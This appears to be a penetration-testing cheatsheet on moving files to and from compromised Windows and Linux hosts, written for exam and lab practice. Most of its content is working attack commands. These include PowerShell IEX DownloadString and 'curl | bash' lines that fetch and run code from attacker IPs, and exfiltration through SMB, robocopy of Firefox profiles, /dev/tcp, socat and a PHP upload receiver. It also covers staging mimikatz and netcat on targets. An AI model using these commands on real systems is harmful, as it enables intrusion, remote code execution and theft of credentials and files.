# File transfer

{% embed url="https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/" %}

## Windows

#### [https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb)

[ttps://butter0verflow.github.io/oscp/OSCP-WindowsPrivEsc-Part1/](https://butter0verflow.github.io/oscp/OSCP-WindowsPrivEsc-Part1/)

[https://cheatsheet.haax.fr/windows-systems/exploitation/file\_transfer/](https://cheatsheet.haax.fr/windows-systems/exploitation/file_transfer/)

### smbserver

{% hint style="info" %}
We can use -user -password with the real credentials of the Windows session so we do not need to use or create a disk unit like Z:\\
{% endhint %}

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash"># SMB SERVER (smbserver.py)
NOTE: If it does not work maybe setting user/pass for the server is mandatory
<strong>
</strong><strong>sudo smbserver.py share . -smb2support -user USER -password PASSWORD # Kali
</strong>net use $DRIVE: \\$IP\$SHARE /USER:USER PASSWORD # DRIVE may be z: for example
cp $FILE $DRIVE:
# From Windows we can use net view \\$IP to see the shared folder.
copy \\$IP\share\file.txt . 
# Disconnect the share when we finish
net use Z: /del
net use \\$IP\$SHARE /del
# NOTE: The hash we see when we tranfer files is NetNTLM. We can try to crack it but cannot be used for PTH.

# On Powershell:
$pass = converto-securestring 'hackthebox' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('antz', $pass) 
New-PSDrive -Name antz -PSProvider FileSystem -Credential $cred -Root \\10.10.14.20\share
</code></pre>

### Powershell

<pre class="language-powershell" data-overflow="wrap" data-full-width="true"><code class="lang-powershell">https://github.com/0v3rride/Simple-PowerShell-HTTP-File-Server
<strong>
</strong><strong>iwr -uri http://$ATTACKER_IP/payload.exe -Outfile service.exe
</strong>powershell.exe wget http://10.10.14.7:8000/nc.exe -OutFile c:\\Users\\mssql-svc\\Documents\\nc.exe

python -m SimpleHTTPServer 80 # Linux 
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.1.0/winPEAS.exe','C:\Temp\WinPEAS.exe')" 
# EXECUTE WITHOUT SAVING TO DISK
C:\> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')

# OTHERS
powershell iwr $ATTACK_IP:/$PATH -o $TARGET_PATH
Start-BitsTransfer -Source $url -Destination $output
iex​(New-Object Net.WebClient).DownloadString('http://10.10.10.0/PowerUp.ps1') 
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Invoke-WebRequest -Uri $url -OutFile $output

# BASE64 (PS needed)
$FILE = "oracle issue.txt"
$Content1 = get-content $FILE
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Content1)
$Encoded = [System.Convert]::ToBase64String($Bytes)
echo $Encoded

#SCRIPTING (POWERSHELL)
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1 
echo $file = "new-exploit.exe" >>wget.ps1 
echo $webclient.DownloadFile($url,$file) >>wget.ps1
C:\> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1
</code></pre>

### certutil / meterpreter / curl

{% code overflow="wrap" %}
```bash
python3 -m http.server 8080 # on Linux
certutil -urlcache -split -f http://$IP:8080/file.txt (C:\Windows\Temp\file.txt)

upload /opt/file.txt # Meterpreter

# From Windows 10 curl is a good option
curl http://IP/file.exe -o file.exe
```
{% endcode %}

### robocopy

{% code overflow="wrap" fullWidth="true" %}
```sh
robocopy C:\users\$USER\appdata\roaming\mozilla\firefox\profiles \\10.10.14.15\share /MIR
```
{% endcode %}

### Long filename with symbols

```bash
# If the file is file_sdfljsdjf_dsfjlsdkfjl.pdf
copy file* # this interprets the whole fullname
```

### scp / pscp

{% code overflow="wrap" %}
```bash
scp $USER@$IP:$PATH $FILEPATHTOSAVETHEFILE
# To copy a file from a local to a remote system run the following command:
scp (-i id_rsa) file.txt remote_username@10.10.0.2:/remote/directory

pscp.exe (NOT PUTTY) or pscp64.exe, depending on the Windows architecture.
# 1 - Upload pscp.exe/pscp64.exe on the Windows machine
# 2 - service ssh start on the Linux machine
# 3 - pscp64.exe -P 22 $WINDOWS_PATH $LINUX_USER@HOST:$LINUX_PATH
# Say yes to store the keys and input the password.
# NOTE: Do not use the root user on Linux unless root login is allowed on sshd_config
# NOTE2: To transfer a folder, use -r flag.
# FROM LINUX TO WINDOWS
pscp64.exe -P 22 kali@192.168.33.10:/tmp/file \C:\Users\Admin\Desktop\
```
{% endcode %}

### FTP / TFTP

{% code overflow="wrap" %}
```bash
# THIS SMALL SECTION SEEMS TO WORK ONLY FOR WINDOWS XP AND 2003 OR OLDER.
kali@kali:~$ sudo apt update && sudo apt install atftp 
kali@kali:~$ sudo mkdir /tftp  
kali@kali:~$ sudo chown nobody: /tftp 
kali@kali:~$ sudo n atftpd --daemon --port 69 /tftp
C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx

# NOTE: IF THERE ARE PROBLEMS WITH FTP TRANSFERS ON WINDOWS, CHECK IF ACTIVE STATUS AND ACTIVE MODE ARE ENABLED
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> binary
# Using nc
quote pasv off
quote acti
bin

# FTP
kali@kali sudo systemctl restart pure-ftpd #start FTP on our Kali VM
C:> echo open 10.10.0.0 21> ftp.txt # connection to our Kali VM
echo USER offsec>> ftp.txt # credentials
echo lab>> ftp.txt
echo bin >> ftp.txt # binary mode
echo GET nc.exe >> ftp.txt # transfer the file
echo bye >> ftp.txt
C:> ftp -v -n -s:ftp.txt

# Script to setup FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd

#FTP2
systemctl restart pure-ftpd
sudo pure-pw passwd offsec #set user/pass
pure-pw useradd <user> -u <user> -d /var/www/domain -f /var/pure-ftpd/pureftpd.passwd
pure-pw useradd $user -u www-data -g www-data -d /var/ftp
sudo pure-pw mkdb
```
{% endcode %}

### PHP

{% code overflow="wrap" fullWidth="true" %}
```php
# TRANSFER FILES FROM WINDOWS TARGET TO LINUX ATTACKING MACHINES (POWERSHELL SCRIPTING LANGUAGES)
# PHP script to receive HTTP POST request (save it as upload.php in /var/www/html)
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
# SAVE IT AS upload.php and host it.
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads #get permission for the user that runs PHP server
sudo chown www-data: upload.php
sudo -u www-data php -S 0.0.0.0:6666
# Run the command below to exfiltrate from Windows to Kali
C:> powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.0.0:8000/upload.php', '/folder/file')
```
{% endcode %}

### RDP

{% code overflow="wrap" fullWidth="true" %}
```
xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-200
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
copy mimikatz.log \\tsclient\test\mimikatz.log
```
{% endcode %}

### Impacket

psexec and wmiexec are shipped with built in feature for file transfer. **Note**: By default whether you upload (**lput**) or download (**lget**) a file, it'll be writte in `C:\Windows` path. Uploading mimikatz.exe to the target machine:

```
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```

Downloading mimikatz.log:

```
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```

### VBS

{% code overflow="wrap" fullWidth="true" %}
```vba
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo Err.Clear >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs 
echo http.Send >> wget.vbs 
echo varByteArray = http.ResponseBody >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs fr echo ts.Close >> wget.vbs
C:\> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```
{% endcode %}

### Misc

{% code overflow="wrap" %}
```bash
upx -9 nc.exe # compress nc.exe to make it smaller 
exe2hex -x nc.exe -p nc.cmd
# COPY ALL THE CONTENT OF nc.cmd AND PASTE IT INTO THE WINDOWS CONSOLE, IT WILL REBUILD IT TO A FUNCTIONAL NETCAT

# IF THERE IS RDP CONNECTION, WE CAN USE THE WEB BROWSER TO RETRIEVE FILES SERVED ON PORT 80

#Ctrl+C/Ctrl+V
Do not understimate copy/paste for transferring files
```
{% endcode %}

### cmd net share

Usually for transferring files from Kali to Windows I’ll use Impacket’s handy smbserver.py. But what if I need to transfer files from a compromised pivot Windows host to another host on the LAN which cannot reach Kali?&#x20;

```c
# We can share folders on Windows on cmd as follows
C:\>net share r_bridge=C:\Lab19 /Grant:Everyone,FULL # share name is r_bridge
# To grant everyone read/write permissions you may need to add
icacls "C:\Path\to\dir>" /t /grant Everyone:FI
```

Remember file-sharing works two way; if I can’t share out host A’s folder so host B can access it, I can always share out host B’s folder so host A can access it. If the shared folder has read/write for Everyone it makes no difference whose folder it is

```bash
# UPDATE***************
# On Windows XP the commands would be
C:\> net share r_bridge=C:\Path\to\dir
C:\> cacls "C:\Path\to\dir>" /T /G Everyone:F
# On the requesting host, you may get an Access Denied in some cases 
# if  you need to specify a password. If you have credentials you can do
net use \\server\share /user:domain\username password
# You should see “command completed successfully” if successful.
# Then you can check if the share is available
net view \\server
# Finally on the file server hosting the share, you can delete with
net share /delete
```

## Linux

### Netcat

```bash
# WITH NETCAT (FROM THE ATTACKER TO THE VICTIM)
nc $ATTACKER_IP $PORT > file #(VICTIM)
nc -lvnp $PORT < file # (ATTACKER)
# ALTERNATIVE
host@victim$ cat $FILE | nc 10.10.14.18 443
host@kali$ nc -lnvp 443 > $FILE
```

### /dev/tcp

{% code overflow="wrap" fullWidth="true" %}
```bash
# On target (considering outbound port 8295 is allowed on the target)
cat file > /dev/tcp/192.168.49.106/8295 
nc -nlvp 8295 > file # on Kali

# First, host CDK binary on your host with public IP.
nc -lvp 999 < cdk #on your host
# Inside the victim container execute
cat < /dev/tcp/(your_public_host_ip)/(port) > cdk

bash -c "exec 3<>/dev/tcp/IP/80; echo -e 'GET /youfile.sh HTTP/1.1\r\nHost: ip\r\nConnection: close\r\n\r\n' >&3; cat <&3 > yourfile.sh" 
```
{% endcode %}

### Misc

```bash
python3 -m http.server 8001
curl $IP/$FILE | bash
curl $IP/$FILE -o $PATH
wget $IP/$FILE -O $PATH

base64 $FILE #--> copy it
# ON KALI LOCAL:
vi file.b64 #--> paste it
base64 -d file.b64 > file

# SCP--------------------
# copy important.txt from our machine to a remote machine 
scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt
# copy a file from a remote computer to our machine
scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt

# SOCAT 
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt # transfer a file
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create # receive a file
```

## Python HTTPS Server

{% code overflow="wrap" fullWidth="true" %}
```python
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```
{% endcode %}

## Apache

```
sudo systemctl start apache2
cp nc.exe /var/www/html
Download it from http://$KALI_IP/nc.exe
```

## Simple HTTP Server (Windows/Linux)

[https://github.com/TheWaWaR/simple-http-server](https://github.com/TheWaWaR/simple-http-server)

## Transfer files from Target 2 to Attacker (chisel)

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Actually chisel client can do reverse port forwarding too. Just need an additional parameter at the end like 0.0.0.0:443:127.0.0.1:9443 to map the target 1's 443/TCP to the attacker's 9443/TCP. To NC from target 2 to attacker, you will set up listener on attack on 9443 and you get target 2 to NC to Target 1 on 443.
